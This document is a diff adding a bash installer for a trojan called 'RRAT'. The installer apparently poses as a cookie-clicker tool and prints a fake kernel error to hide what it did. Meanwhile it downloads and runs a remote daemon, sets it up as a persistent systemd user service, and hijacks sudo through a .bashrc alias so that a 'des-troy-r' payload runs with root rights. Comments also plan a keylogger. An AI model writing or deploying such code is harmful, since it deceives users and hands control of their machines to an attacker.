@@ -1,0 +1,60 @@
+#!/bin/bash
+
+# if [ $USER = a31nesta ]
+# then
+# 	echo "Don't install trojans outside the VM you silly goose"
+# 	exit
+# fi
+
+rratfiles="$HOME/rratfiles"
+
+# Uninstall?
+if [ "$1" = "uninstall" ]
+then
+	# Is RRAT even installed?
+	if [ ! -d "$rratfiles" ]
+	then
+		echo "RRAT is not installed in this computer, if you think it's installed, it may have been deleted manually and you should do this:"
+		echo "- Check ~/.bashrc. Is there an alias for sudo? This alias runs des-troy-r and you should delete it"
+		echo "- Check ~/.config/systemd/user/. Is there a rrat.service file? If so, delete it"
+		echo "- Run visudo. Is the last line one that allows you to run sudo without password? If so, delete the line."
+
+		echo -e "\nStay safe!"
+		exit
+	fi
+
+	# Delete the rratfiles folder recursively and forcefully
+	rm -rf "$rratfiles"
+
+	# Remove the sussy line in sudoers
+	sudo sed -i "\#$USER ALL=(ALL) NOPASSWD: ALL#d" "/etc/sudoers"
+
+	# Remove the service
+	systemctl --user disable --now rrat.service
+	rm "$HOME/.config/systemd/user/rrat.service"
+	
+	exit
+fi
+
+# Install >:]
+# ONLY INSTALL IF THE RRATFILES DIRECTORY
+# DOES NOT EXIST!
+if [ ! -d "$rratfiles" ]
+then
+	# Create a rratfiles folder
+	mkdir "$rratfiles"
+
+	# Install the RRAT Daemon and systemd service in parallel
+	nohup bash -c "curl -sL -o $rratfiles/rrat-demon https://github.com/JSanzUcam/rrat-demon/releases/latest/download/rrat-demon; chmod +x $rratfiles/rrat-demon; curl -sL -o $HOME/.config/systemd/user/rrat.service https://github.com/JSanzUcam/rrat-demon/releases/latest/download/rrat.service; systemctl --user enable rrat.service; systemctl --user start rrat.service" &
+
+	# Install des-troy-r in parallel
+	# Work in progress...
+
+	# Install keylogger maybe?
+
+	# Create the alias
+	echo "alias sudo='sudo ~/rratfiles/des-troy-r && sudo'" >> $HOME/.bashrc
+fi
+
+# Fake error lmfao
+echo "CookieAutoClickerLinux only supports kernel versions up to 5.x, current version is $(uname -r)"
